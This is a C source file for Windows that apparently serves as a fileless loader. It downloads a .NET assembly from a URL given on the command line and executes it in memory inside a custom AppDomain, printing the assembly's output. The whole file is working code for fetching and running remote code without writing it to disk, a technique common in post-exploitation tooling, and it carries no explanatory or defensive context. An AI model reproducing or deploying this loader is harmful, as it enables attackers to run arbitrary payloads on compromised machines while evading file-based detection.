#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "DotnetExecute.h"

BOOL ReadFileFromURLA(
    IN LPCSTR url,
    OUT PBYTE* ppFileBuffer,
    OUT PDWORD pdwFileSize
);

int main(int argc, char* argv[]) {
    PBYTE AssemblyBytes = NULL;
    DWORD AssemblySize = 0;
    LPSTR OutputBuffer = NULL;
    ULONG OutputLength = 0;

    if (argc < 2) {
        printf("Usage: %s <url> [arguments...]\n", argv[0]);
        return 1;
    }

    LPCSTR url = argv[1];
    PWSTR arguments = NULL;

    if (argc > 2) {
        size_t totalLen = 0;
        for (int i = 2; i < argc; i++) {
            totalLen += strlen(argv[i]) + 1;
        }

        arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalLen * sizeof(WCHAR));
        if (!arguments) {
            printf("[-] HeapAlloc failed for arguments\n");
            return 1;
        }

        size_t convertedChars = 0;
        for (int i = 2; i < argc; i++) {
            errno_t err = mbstowcs_s(&convertedChars, arguments + wcslen(arguments), totalLen, argv[i], _TRUNCATE);
            if (err != 0) {
                printf("[-] mbstowcs_s failed with error code: %d\n", err);
                HeapFree(GetProcessHeap(), 0, arguments);
                return 1;
            }
            if (i < argc - 1) {
                wcscat_s(arguments, totalLen, L" ");
            }
        }
    }
    else {
        arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WCHAR));
        if (!arguments) {
            printf("[-] HeapAlloc failed for empty arguments\n");
            return 1;
        }
        arguments[0] = L'\0';
    }

    if (!ReadFileFromURLA(url, &AssemblyBytes, &AssemblySize)) {
        puts("[-] ReadFileFromURLA Failed");
        HeapFree(GetProcessHeap(), 0, arguments);
        return 1;
    }

    if (DotnetExecute(AssemblyBytes, AssemblySize, (PWSTR)L"MyAppDomain", arguments, &OutputBuffer, &OutputLength)) {
        puts("[-] DotnetExecute Failed");
    }
    else {
        printf("\n\n%s", OutputBuffer);
    }

    HeapFree(GetProcessHeap(), 0, AssemblyBytes);
    HeapFree(GetProcessHeap(), 0, OutputBuffer);
    HeapFree(GetProcessHeap(), 0, arguments);
    return 0;
}
